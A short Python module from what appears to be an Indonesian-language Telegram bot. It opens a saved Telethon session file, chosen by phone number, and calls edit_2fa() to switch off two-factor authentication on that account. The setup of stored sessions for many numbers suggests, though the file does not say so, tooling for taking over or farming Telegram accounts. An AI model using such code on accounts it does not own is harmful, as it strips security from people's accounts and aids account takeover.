# disable_2fa.py

import os
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telegram import Update
from telegram.ext import ContextTypes

SESSION_FOLDER = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'login3'))

async def disable_2fa(update: Update, context: ContextTypes.DEFAULT_TYPE, phone_number: str):
    query = update.callback_query
    await query.answer()

    session_path = os.path.join(SESSION_FOLDER, f"{phone_number}.session")

    if not os.path.exists(session_path):
        await query.message.reply_text(
            f"❌ Session tidak ditemukan untuk:\n`{phone_number}`",
            parse_mode='Markdown'
        )
        return

    api_id = context.bot_data.get("api_id")
    api_hash = context.bot_data.get("api_hash")

    client = TelegramClient(session_path, api_id, api_hash)
    await client.connect()

    if not await client.is_user_authorized():
        await query.message.reply_text("❌ Akun belum login.")
        await client.disconnect()
        return

    try:
        await client.edit_2fa()  # Nonaktifkan 2FA
        await query.message.reply_text("✅ 2FA berhasil dinonaktifkan.")
    except SessionPasswordNeededError:
        await query.message.reply_text("❌ Akun memiliki 2FA aktif, tetapi gagal menonaktifkannya karena butuh password.")
    except Exception as e:
        await query.message.reply_text(f"❌ Gagal menonaktifkan 2FA:\n`{e}`", parse_mode='Markdown')
    finally:
        await client.disconnect()
